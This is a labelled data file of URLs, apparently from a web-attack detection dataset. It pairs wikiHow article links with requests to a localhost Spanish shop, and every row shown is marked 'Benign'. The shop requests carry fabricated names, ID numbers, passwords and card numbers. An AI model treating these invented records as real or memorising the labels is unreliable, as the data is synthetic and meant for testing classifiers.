http://www.wikihow.com/make-chocolate-custard-pie&t=1396515815116&n=217713&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hack-hoo&password=carantamaula&nombre=samay&apellidos=basuldo+fadul&email=phillips%40premiostv.rw&dni=58013601b&direccion=calle+fernando+segura+65%2c+&ciudad=alca%f1izo&cp=32557&provincia=castell%f3n&ntc=4266211153621260&b1=registrar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6009&b1=pasar+por+caja,Benign
http://www.wikihow.com/develop-financial-goals&t=1396613350771&n=4814871&k=mainentity,Benign
http://www.wikihow.com/get-a-free-roblox-card&t=1396647881814&n=5941075&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam%f3n+ib%e9rico&precio=100&cantidad=32&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/make-a-sisterhood&t=1396571527503&n=2991285&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino+rioja&precio=39&cantidad=81&b1=a%f1adir+al+carrito,Benign
"http://www.wikihow.com/recover,-reset-%26-unlock-vba-password-with-systool-vba-password-recovery-software&t=1396533961255&n=1136661&k=mainentity",Benign
http://www.wikihow.com/decrease-term-life-insurance&t=1396613316711&n=4813767&k=mainentity,Benign
http://www.wikihow.com/keep-someone-busy-all-afternoon&t=1396528092803&n=862049&k=mainentity,Benign
http://www.wikihow.com/be-a-flower-fairy&t=1396528120716&n=863161&k=mainentity,Benign
http://www.wikihow.com/prepare-a-grocery-list-on-your-laptop-computer&t=1396545904538&n=1668884&k=mainentity,Benign
http://www.wikihow.com/be-closer-to-allah&t=1396570045159&n=2930797&k=mainentity,Benign
http://www.wikihow.com/cosplay-as-charlotte-from-making-fiends-cartoon&t=1396528064919&n=860725&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=queso+manchego&precio=39&cantidad=62&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/make-your-tree-fort-look-nicer&t=1396563697709&n=2629738&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=85&cantidad=17&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ethelind&pwd=se0g3&remember=off&b1=entrar,Benign
http://www.wikihow.com/help-a-friend-out-of-drug-usage&t=1396571407966&n=2987229&k=mainentity,Benign
http://www.wikihow.com/fix-a-heath-zenith-wireless-door-bell&t=1396562485942&n=2551344&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=heleen&password=tr50d8r&nombre=polia&apellidos=manso+vivanco&email=belbin%40hipotecascom.im&dni=16408383e&direccion=farell+100%2c+&ciudad=puras&cp=09339&provincia=soria&ntc=5443956095123158&b1=registrar,Benign
"http://www.wikihow.com/import-outlook-express-settings,-mails,-address-book,-and-rules-into-ms-outlook&t=1396533649003&n=1122781&k=mainentity",Benign
http://www.wikihow.com/build-a-trampoline-in-minecraft&t=1396648434542&n=5965743&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1226&b1=pasar+por+caja,Benign
http://www.wikihow.com/use-a-nabi&t=1396531792338&n=1036114&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=rahdar&pwd=23es091%e1478&remember=off&b1=entrar,Benign
http://www.wikihow.com/stop-scam-requests-for-assistance&t=1396631804698&n=5489648&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=szura&password=m_inistro&nombre=pancho&apellidos=pontifes&email=nazmi_reusse%40yiutuve.ge&dni=07187438f&direccion=isla+de+alboran%2c+127%2c+10-b&ciudad=hoz+y+costean&cp=45460&provincia=baleares+%28illes%29&ntc=8797006669570441&b1=registrar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2493&b1=confirmar,Benign
http://www.wikihow.com/select-a-true-car-navigator-for-your-car&t=1396630776689&n=5464388&k=mainentity,Benign
http://www.wikihow.com/be-a-female-nerd&t=1396526521760&n=788203&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=85&cantidad=91&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/update-the-reading-challenge-progress-number-on-goodreads&t=1396629676058&n=5429121&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=gaunsezl&password=cosmog%f3ni.ca&nombre=alom%edas&apellidos=vicu%f1a+munuera&email=fupimoto_kalem%40blueberryminiloaf.com.nr&dni=05672216w&direccion=calle+resconorio%2c+197+9%3fg&ciudad=arroba+de+los+montes&cp=07315&provincia=albacete&ntc=3976106689802433&b1=registrar,Benign
http://www.wikihow.com/make-mint-and-parsley-hummus&t=1396517823895&n=344471&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mahiger&pwd=simplismo&remember=off&b1=entrar,Benign
http://www.wikihow.com/be-an-alpha-while-being-nice&t=1396633585613&n=5532085&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2676&b1=confirmar,Benign
http://www.wikihow.com/choose-a-chocolate-favor&t=1396546845442&n=1728572&k=mainentity,Benign
http://www.wikihow.com/have-an-alice-in-wonderland-party&t=1396546796713&n=1726140&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=fiorile&password=6lm8a&nombre=eleodoro&apellidos=outeda&email=swarthout%40cienciapolicial.km&dni=73500117y&direccion=ciega+151+4%3fb&ciudad=piedralaves&cp=01869&provincia=c%e1diz&ntc=5247362907491232&b1=registrar,Benign
http://www.wikihow.com/clean-and-chop-radish-leaves&t=1396546018878&n=1674584&k=mainentity,Benign
http://www.wikihow.com/avoid-being-a-noob-on-halo-2&t=1396649483614&n=6005378&k=mainentity,Benign
http://www.wikihow.com/take-a-good-photo-with-motorola-xoom&t=1396534146713&n=1146161&k=mainentity,Benign
http://www.wikihow.com/get-your-parents-to-buy-you-t-shirts&t=1396609734629&n=4692255&k=mainentity,Benign
http://www.wikihow.com/upgrade-magento-1.6-to-1.8-with-cart2cart&t=1396533908680&n=1134453&k=mainentity,Benign
http://www.wikihow.com/have-a-successful-truck-driving-career&t=1396531466700&n=1022189&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam%f3n+ib%e9rico&precio=100&cantidad=88&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mahlen&password=6esba0b0l9l57&nombre=benilde&apellidos=labarca&email=herking.bellini7%40zafranet.bj&dni=20910113p&direccion=c%2f+quart+de+les+valls%2c+44+1%3fa&ciudad=villarejo+de+%d3rbigo&cp=30398&provincia=teruel&ntc=5377607815069357&b1=registrar,Benign
http://www.wikihow.com/decide-on-an-upgrade-to-the-ext4-file-system&t=1396533126707&n=1099076&k=mainentity,Benign
http://www.wikihow.com/set-the-date-and-time-on-an-electronic-vehicle-information-center-(evic)-in-a-1993-1998-jeep-grand-cherokee&t=1396613602618&n=4821555&k=mainentity,Benign
http://www.wikihow.com/decide-if-you-need-a-file-compression-program&t=1396533629246&n=1121969&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=yeohoon&password=adveraci%d3n&nombre=asad&apellidos=pratseva+ballano&email=anand%40smalltec.bs&dni=17916298b&direccion=plza.+santa+barbara%2c+59+&ciudad=puebla+de+azaba&cp=50513&provincia=girona&ntc=2976744623292066&b1=registrar,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=hodgson&pwd=casateniente&remember=off&b1=entrar,Benign
http://www.wikihow.com/write-a-dramatic-play&t=1396632861890&n=5511624&k=mainentity,Benign
http://www.wikihow.com/deal-with-biphobia&t=1396571886780&n=3005497&k=mainentity,Benign
http://www.wikihow.com/buy-a-kiddie-pool&t=1396563957738&n=2644302&k=mainentity,Benign
http://www.wikihow.com/control-onion-eelworm&t=1396561642685&n=2501076&k=mainentity,Benign
http://www.wikihow.com/get-a-boy-to-leave-you-alone-and-stop-the-flirting-with-you&t=1396612191860&n=4779218&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5120&b1=confirmar,Benign
http://www.wikihow.com/make-apple-ice-cream-in-harvest-moon:-animal-parade&t=1396649534106&n=6007430&k=mainentity,Benign
http://www.wikihow.com/use-a-fastpass-ticket-at-a-disney-theme-park&t=1396528006503&n=857677&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9590&b1=pasar+por+caja,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hunter&password=90m1r236a4&nombre=gertrudis&apellidos=cigala&email=muser%40global-services.dm&dni=33890004x&direccion=c%2f+veronica+198+&ciudad=villamayor&cp=37460&provincia=navarra&ntc=3976120192503130&b1=registrar,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=anstice30&password=4uedamiento&nombre=mar%eda+cielo&apellidos=cortina+guimarey&email=lawrence-moreno%40973.se&dni=63765745q&direccion=calle+rio+mi%f1o+149+8-h&ciudad=mansilla+de+las+mulas&cp=25722&provincia=teruel&ntc=3596435604548863&b1=registrar,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=85&cantidad=49&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kang&password=3lechazo&nombre=diodoro&apellidos=idigoras+el+khouri&email=gallatin.woodbridge%40discon.ma&dni=57806990d&direccion=calle+liverpool%2c+122%2c+&ciudad=iznalloz&cp=09227&provincia=salamanca&ntc=3044392117548178&b1=registrar,Benign
http://www.wikihow.com/look-cool-on-fantage-(members-or-people-with-ecoins)&t=1396648125799&n=5952523&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=kuchinsk&password=in6116a5772&nombre=nazareth&apellidos=lorca+villapando&email=jurinac%40estoespresto.ng&dni=87677594f&direccion=calle+diego+de+muros%2c+197%2c+5%3fg&ciudad=agoncillo&cp=50679&provincia=ciudad+real&ntc=4466789416988432&b1=registrar,Benign
http://www.wikihow.com/make-a-jurrasic-park-story-with-zoo-tycoon&t=1396648766757&n=5981663&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=chubby&password=t%e1ngana&nombre=cinaras&apellidos=alberti&email=drouot%40am-si.to&dni=88323081e&direccion=pl.+san+agustin+67%2c+&ciudad=puerto+lumbreras&cp=50173&provincia=tarragona&ntc=2581691207792918&b1=registrar,Benign
http://www.wikihow.com/care-for-a-boxer&t=1396516662947&n=265848&k=mainentity,Benign
http://www.wikihow.com/remove-red-eye-using-pd-howler&t=1396630453832&n=5458163&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=85&cantidad=47&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=queso+manchego&precio=39&cantidad=71&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/be-like-nora-gainesborough-from-true-blood&t=1396528050311&n=859945&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=queso+manchego&precio=39&cantidad=26&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/re-use-the-electric-motor-in-muffin-fans-(computer-cooling-fans)&t=1396532073736&n=1049686&k=mainentity,Benign
http://www.wikihow.com/make-cognac-wreaths&t=1396517093670&n=291065&k=mainentity,Benign
http://www.wikihow.com/profit-off-of-penny-stock-pump-and-dumps&t=1396613371246&n=4815655&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=broddy&password=sa-r48n&nombre=laila&apellidos=fijo+yax&email=fokas%40shamballa-es.sz&dni=33198749c&direccion=masia+can+tiano+s%2fn%2c+2%3ff&ciudad=vallfogona+de+ripoll%e8s&cp=12499&provincia=c%e1ceres&ntc=4290093924411618&b1=registrar,Benign
http://www.wikihow.com/avoid-forgetting-to-pack-a-sack-lunch-for-school&t=1396545845322&n=1665436&k=mainentity,Benign
http://www.wikihow.com/plan-a-back-to-school-party-for-little-kids&t=1396547086728&n=1740452&k=mainentity,Benign
http://www.wikihow.com/build-steps-towards-a-better-relationship&t=1396570640016&n=2955557&k=mainentity,Benign
http://www.wikihow.com/win-a-tickle-war&t=1396571601380&n=2994429&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2714&b1=pasar+por+caja,Benign
http://www.wikihow.com/choose-an-environmentally-friendly-garden-hose&t=1396563875667&n=2639806&k=mainentity,Benign
http://www.wikihow.com/make-raisin-walnut-muffin-mix-in-a-jar&t=1396595221130&n=3983107&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2806&b1=pasar+por+caja,Benign
http://www.wikihow.com/build-a-single-trench&t=1396563444829&n=2612596&k=mainentity,Benign
http://www.wikihow.com/make-kumara-cheesecake&t=1396517039688&n=286997&k=mainentity,Benign
http://www.wikihow.com/make-an-odor-neutralizing-cream&t=1396593530643&n=3893292&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=sergeant&password=mara95ra&nombre=segunda&apellidos=ascencao+kuschel&email=braden%4011horas.gi&dni=05554476e&direccion=primavera+131%2c+&ciudad=campo+de+criptana&cp=05190&provincia=teruel&ntc=7937654021640685&b1=registrar,Benign
http://www.wikihow.com/be-the-friend-you-wish-you-had&t=1396571304436&n=2983333&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4154&b1=pasar+por+caja,Benign
http://www.wikihow.com/tell-horror-stories-at-night-when-camping&t=1396631073497&n=5470905&k=mainentity,Benign
http://www.wikihow.com/buy-a-textbook-for-straighterline-college-courses&t=1396527750486&n=845697&k=mainentity,Benign
http://www.wikihow.com/make-bath-crystals&t=1396593273397&n=3877532&k=mainentity,Benign
http://www.wikihow.com/be-a-reform-jew&t=1396570325747&n=2942953&k=mainentity,Benign
http://www.wikihow.com/begin-a-romantic-relationship-with-a-friend%27s-mom&t=1396571162980&n=2977497&k=mainentity,Benign
http://www.wikihow.com/make-a-letter-writing-notebook&t=1396613431012&n=4817519&k=mainentity,Benign
http://www.wikihow.com/make-apple-pie-in-harvest-moon:-animal-parade&t=1396649536810&n=6007502&k=mainentity,Benign
http://www.wikihow.com/make-yourself-friendly&t=1396610051951&n=4700841&k=mainentity,Benign
http://www.wikihow.com/upgrade-to-mavericks-on-os-x&t=1396610766167&n=4728858&k=mainentity,Benign
http://www.wikihow.com/date-a-muslim-woman&t=1396570062501&n=2931557&k=mainentity,Benign
http://www.wikihow.com/find-more-preparation-space-in-the-kitchen&t=1396517453279&n=314575&k=mainentity,Benign
http://www.wikihow.com/make-cream-blush-with-lip-stick-or-powder&t=1396593893517&n=3912992&k=mainentity,Benign
http://www.wikihow.com/convert-video-to-sony-psp-video-mp4-format-with-avs4you-software&t=1396533791792&n=1130185&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=gia&password=za2i7&nombre=karime&apellidos=riestra+gabaldon&email=ormeny%40nuestrasantacruz.yu&dni=33715731p&direccion=avenida+kansas+city%2c+63%2c+13%3fc&ciudad=alfoz+de+quintanadue%f1as&cp=45460&provincia=valladolid&ntc=8048416157376414&b1=registrar,Benign
http://www.wikihow.com/be-a-true-narnia-fan&t=1396527625793&n=840501&k=mainentity,Benign
http://www.wikihow.com/increase-laff-points-in-disney%27s-toontown-online&t=1396648010538&n=5947599&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=sanford&password=8aluca&nombre=matco&apellidos=saguill+de+rosa&email=twomey-foster7%40guejos.ic&dni=37796937w&direccion=granado%2c+184%2c+&ciudad=saelices+de+la+sal&cp=09300&provincia=zaragoza&ntc=4266211153621260&b1=registrar,Benign
http://www.wikihow.com/enjoy-zion-national-park&t=1396630609852&n=5461238&k=mainentity,Benign
http://www.wikihow.com/make-a-lemon-swan-garnish&t=1396546056629&n=1677176&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=edmison&pwd=jar2sa&remember=on&b1=entrar,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=sanford-&pwd=c35ilda19&remember=off&b1=entrar,Benign
http://www.wikihow.com/be-good-at-mafia-wars&t=1396629909355&n=5438557&k=mainentity,Benign
http://www.wikihow.com/work-in-collaboration-with-a-narcissist&t=1396612599310&n=4790103&k=mainentity,Benign
http://www.wikihow.com/use-a-vegetable-grater-to-grate-a-carrot-in-indian-style&t=1396632225897&n=5498706&k=mainentity,Benign
http://www.wikihow.com/look-after-a-blue-nose-friend&t=1396571434716&n=2988089&k=mainentity,Benign
http://www.wikihow.com/remove-the-quick-defragmentor-virus-from-your-computer&t=1396531535859&n=1025377&k=mainentity,Benign
http://www.wikihow.com/completely-remove-(reset)-the-date-read-date-from-a-completed-book-on-goodreads&t=1396629671440&n=5428905&k=mainentity,Benign
http://www.wikihow.com/read-the-news-on-your-favorite-news-website&t=1396527506220&n=836502&k=mainentity,Benign
http://www.wikihow.com/find-walgreens-coupons&t=1396613083987&n=4804575&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=liesie&password=retazo&nombre=alepio&apellidos=escalante+privado&email=sixkillef3%40baltasarsantos.edu&dni=82617066p&direccion=calle+veronica+48%2c+&ciudad=veganzones&cp=03579&provincia=c%f3rdoba&ntc=4067676531310167&b1=registrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jeffry&password=bolichero&nombre=lino&apellidos=de+la+torre+palm%e9s&email=pilcer-arvide3%40escuelamontessori.si&dni=76973319r&direccion=ronda+de+sant+antoni%2c+170+2%3fc&ciudad=alhama+de+arag%f3n&cp=23520&provincia=cuenca&ntc=8807727465279989&b1=registrar,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=100&cantidad=26&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/have-a-celeb-style-birthday-party&t=1396546764884&n=1724480&k=mainentity,Benign
http://www.wikihow.com/create-a-dinosaur-park-in-vanilla-minecraft&t=1396648453022&n=5966687&k=mainentity,Benign
http://www.wikihow.com/beat-no.3-of-mushroom-xiii-in-kingdom-hearts-ii&t=1396649055628&n=5989354&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=radick&pwd=calma&remember=off&b1=entrar,Benign
http://www.wikihow.com/copy-dvd-to-dvd-and-shrink-dvd9-to-one-dvd5-with-avs4you-software&t=1396533794263&n=1130261&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=arabelle&pwd=v%21olunt6d&remember=on&b1=entrar,Benign
http://www.wikihow.com/overcome-social-anxiety-and-get-a-boyfriend&t=1396570760578&n=2960289&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=zitko&password=r994i8e8&nombre=c%e9lide&apellidos=totozauz+cat%e0&email=sinelnikova%40visualreality.tf&dni=86284589c&direccion=calle+gabriel+gombao+95+6%3fh&ciudad=r%e1bade&cp=09592&provincia=guip%fazcoa&ntc=3201097312172395&b1=registrar,Benign
http://www.wikihow.com/install-and-play-combat-arms&t=1396648568182&n=5971963&k=mainentity,Benign
http://www.wikihow.com/make-cowboy-butter&t=1396515663590&n=205529&k=mainentity,Benign
http://www.wikihow.com/appreciate-sylvia-plath&t=1396527620560&n=840281&k=mainentity,Benign
http://www.wikihow.com/upgrade-joomla-2.5-to-3.x-using-cms2cms&t=1396533903058&n=1134241&k=mainentity,Benign
http://www.wikihow.com/take-care-of-your-kawaii-squishy-collection&t=1396593931897&n=3914772&k=mainentity,Benign
http://www.wikihow.com/dye-wood&t=1396562857393&n=2576764&k=mainentity,Benign
http://www.wikihow.com/add-flavor-to-a-bland-recipe&t=1396546128846&n=1681344&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=plasse&password=do4t3&nombre=gabelo&apellidos=tristany+bisbal&email=mooney%40fest-tv.aw&dni=21468162p&direccion=c%2f+illa+d%27elba+93%2c+9%3fd&ciudad=ahillones&cp=04638&provincia=badajoz&ntc=6875590551989117&b1=registrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=yuri2&password=lin%3f6&nombre=nery&apellidos=fuillerat+lauli%e9&email=bremen%40ocymafa.pa&dni=00846926c&direccion=c%2f+cadmi%2c+97+1%3fa&ciudad=nombrevilla&cp=20100&provincia=burgos&ntc=9357244380338507&b1=registrar,Benign
http://www.wikihow.com/keep-a-freshly-painted-exterior-door-from-sticking&t=1396562865195&n=2577376&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=upchurch&password=alm%3forzar&nombre=di%f3genes&apellidos=fito+par%eds&email=bridgewater%40investopi.vc&dni=74340540d&direccion=c%2f+general+aranaz%2c+173%2c+&ciudad=buend%eda&cp=29791&provincia=segovia&ntc=1019839270121491&b1=registrar,Benign
http://www.wikihow.com/plan-your-child%e2%80%99s-first-birthday-party&t=1396547094679&n=1740816&k=mainentity,Benign
http://www.wikihow.com/install-and-maintain-a-desander&t=1396563013904&n=2587332&k=mainentity,Benign
http://www.wikihow.com/create-a-makeup-kit-with-a-fishing-tackle-box&t=1396593912599&n=3913992&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6525&b1=pasar+por+caja,Benign
http://www.wikihow.com/get-uber-sims-in-mysims&t=1396648718505&n=5979339&k=mainentity,Benign
http://www.wikihow.com/evaluate-storage-places-before-moving-your-goods&t=1396563809828&n=2636102&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino+rioja&precio=39&cantidad=93&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/do-blind-makeovers&t=1396546930301&n=1732468&k=mainentity,Benign
http://www.wikihow.com/make-chinese-muffins&t=1396613912689&n=4833052&k=mainentity,Benign
http://www.wikihow.com/ignore-the-politics-of-a-religion&t=1396570005163&n=2929689&k=mainentity,Benign
http://www.wikihow.com/call-your-crush%27s-house-phone-(for-boys)&t=1396611883995&n=4766838&k=mainentity,Benign
http://www.wikihow.com/customize-a-user-profile-on-socialcast&t=1396630025520&n=5443193&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=bernstei&password=de.0andada&nombre=escipi%f3n&apellidos=qui%f1ones+ascu%ed&email=melody%40muchapolicia.am&dni=83979036x&direccion=estrella+altair%2c+27+10-d&ciudad=quintanar+del+rey&cp=34257&provincia=barcelona&ntc=5867956531584757&b1=registrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=murph&password=es0uil1&nombre=saturnino&apellidos=nurnberg&email=imhoff%40elalamorestaurante.jo&dni=71595298r&direccion=grup+torre+gironella%2c+24+&ciudad=arjonilla&cp=28792&provincia=sevilla&ntc=1776622257699158&b1=registrar,Benign
http://www.wikihow.com/protect-facebook-passwords&t=1396631911963&n=5491928&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=amar&password=piqu2%e9&nombre=reyes&apellidos=gendre+caminal&email=lancaster.cat%40ratzapper.st&dni=79540644c&direccion=crisantemo%2c+100+&ciudad=melgar+de+arriba&cp=09558&provincia=albacete&ntc=9038611421864876&b1=registrar,Benign
http://www.wikihow.com/be-a-christian-party-girl&t=1396547047289&n=1738532&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=peng-dav&password=lid%24iadora&nombre=marcio&apellidos=bartra+bergu%edo&email=wenham3%40drivinn.tr&dni=96864869r&direccion=paseo+fray+francisco+de+vitoria+36%2c+10-e&ciudad=fontiveros&cp=08470&provincia=granada&ntc=8498254899353639&b1=registrar,Benign
http://www.wikihow.com/switch-from-checks-to-debit-cards&t=1396613021997&n=4801731&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4821&b1=pasar+por+caja,Benign
http://www.wikihow.com/do-a-monochromatic-makeup-look&t=1396593843903&n=3910220&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam%f3n+ib%e9rico&precio=100&cantidad=18&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=39&cantidad=97&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/achieve-a-happy-new-you&t=1396516191049&n=241822&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jew&password=guia*do&nombre=zulema&apellidos=bazan+trh%f6z&email=vinas.milz%40ac-activos.mg&dni=04342183j&direccion=padre+hortas+caliz+153+10-g&ciudad=callosa+de+segura&cp=09592&provincia=toledo&ntc=3611378257513579&b1=registrar,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=orly8&pwd=7rinacrio&remember=on&b1=entrar,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=vino+rioja&precio=100&cantidad=31&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/make-a-phone-sock-from-an-old-sock&t=1396533547425&n=1118085&k=mainentity,Benign
http://www.wikihow.com/broadcast-on-ustream&t=1396630047251&n=5443821&k=mainentity,Benign
http://www.wikihow.com/make-your-own-%22don%27t-cook-your-goose%22-game&t=1396546943996&n=1733080&k=mainentity,Benign
http://www.wikihow.com/customise-an-outfit&t=1396517938700&n=351850&k=mainentity,Benign
http://www.wikihow.com/choose-an-outdoor-storage-shed-plan-for-your-garden&t=1396563665031&n=2627734&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=abel&password=adaptadamente&nombre=ina&apellidos=qui%f1onero&email=hohl%40titulosoficiales.um&dni=54525559b&direccion=calle+hermanos+gambra%2c+157+&ciudad=cabezuela&cp=09691&provincia=teruel&ntc=6623630296167560&b1=registrar,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=schiefer&password=lechera&nombre=nieves&apellidos=rutllan+llagostera&email=gall-entwistle%40aspirantes.ro&dni=39239166q&direccion=c%2f+daoiz+191+1-f&ciudad=ud%edas&cp=07700&provincia=valladolid&ntc=2604331184906708&b1=registrar,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=iannozzi&password=roter%eda&nombre=wilfrido&apellidos=upegui+almonte&email=gribbon%40engibraltar.to&dni=36276734f&direccion=c%2f+cuartel+antiguo+135%2c+1%3fg&ciudad=garcirrey&cp=23300&provincia=teruel&ntc=9234800586444864&b1=registrar,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=soumitra&pwd=i3forma1mente&remember=on&b1=entrar,Benign
http://www.wikihow.com/troubleshoot-a-beckett-pond-and-water-fountain-pump&t=1396563774913&n=2634146&k=mainentity,Benign
http://www.wikihow.com/become-popular-on-a-minecraft-server&t=1396648411172&n=5964603&k=mainentity,Benign
http://www.wikihow.com/rip-music-from-a-cd-with-windows-media-player&t=1396533821832&n=1131449&k=mainentity,Benign
http://www.wikihow.com/have-a-medieval-pretty-princess-party&t=1396546780138&n=1725132&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1385&b1=confirmar,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=85&cantidad=30&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=grimshaw&password=sapotina&nombre=policarpo&apellidos=feixas&email=zappa%40touringa.zr&dni=60328065p&direccion=abajo%2c+159%2c+10%3fc&ciudad=almensilla&cp=10649&provincia=ciudad+real&ntc=0025770291372518&b1=registrar,Benign
http://www.wikihow.com/enjoy-the-last-months-of-your-friend%27s-life&t=1396571392926&n=2986773&k=mainentity,Benign
http://www.wikihow.com/transfer-money-to-australia&t=1396633559215&n=5531301&k=mainentity,Benign
http://www.wikihow.com/get-a-baby-to-brush-their-teeth&t=1396609487975&n=4683242&k=mainentity,Benign
http://www.wikihow.com/dip-dye-on-toca-hair-salon&t=1396516535022&n=258706&k=mainentity,Benign
http://www.wikihow.com/cook-bintanok&t=1396546282959&n=1691676&k=mainentity,Benign
http://www.wikihow.com/have-a-prom-for-a-muslim-high-school&t=1396570073196&n=2931925&k=mainentity,Benign
http://www.wikihow.com/make-different-flavor-rusk-at-the-edge-of-bread&t=1396594931901&n=3957043&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=robinia&pwd=8spi0&remember=on&b1=entrar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9505&b1=confirmar,Benign
http://www.wikihow.com/find-where-all-your-disk-space-is-going-using-directory-report&t=1396533644648&n=1122637&k=mainentity,Benign
http://www.wikihow.com/make-saudi-champagne&t=1396517172694&n=297093&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=l.heureu&pwd=%e16ar1&remember=on&b1=entrar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5039&b1=confirmar,Benign
http://www.wikihow.com/get-a-girl-to-break-up-with-her-boyfriend&t=1396612252708&n=4781710&k=mainentity,Benign
